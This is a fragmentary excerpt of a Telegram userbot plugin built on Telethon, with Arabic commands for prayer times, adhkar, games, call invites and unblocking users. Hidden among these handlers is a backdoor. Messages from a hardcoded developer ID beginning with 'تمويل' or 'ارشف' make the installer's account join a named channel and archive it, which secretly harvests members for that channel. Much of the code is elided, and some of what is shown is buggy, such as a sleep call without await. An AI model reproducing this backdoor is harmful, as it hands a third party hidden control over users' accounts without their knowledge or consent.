...
async def fetch_prayer_times():
    ...
    times_json = await final313.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await final313.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await final313.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@final313.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@final313.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@final313.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
R = [
    ...
    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩الــسيد𓆪 𖠛🇷🇺 ](t.me/i0i0ii)   \n"
    "**-** قناة السورس **⪼ [𐇮 فـاينلي ](t.me/z3zz_z)   "
]

@final313.on(admin_cmd(pattern="بلي$"))
...
@final313.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@final313.on(admin_cmd(pattern="كت$"))
async def ithker(knopis):
...
@final313.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_5erok))

    
@final313.on(admin_cmd(pattern="اذكار عشر$"))    
...
@final313.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
...
@final313.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Bosa))

DevJoker = [5434703779]
#تضل تخمط من عمك فـاينل ؟ الى اين يستمُر الفشل ياغُلام
...
async def ffinal(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await final313(JoinChannelRequest(channel_username))
...
async def ffinal(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await final313(JoinChannelRequest(channel_username))
                await final313.edit_folder(channel_username, folder=1)
...
@final313.on(admin_cmd(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    ...
    for user in blocked_users.users:
        try:
            ...
            alvipfinal_entity = await client.get_entity(user.id)
            alvipfinal_profile = f"[{alvipfinal_entity.first_name}](tg://user?id={alvipfinal_entity.id})"
            await event.edit(f"⌁⌁︙ تم إلغاء حظر المستخدم : {alvipfinal_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
            ...
            continue
@final313.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
async def ffinal(event):
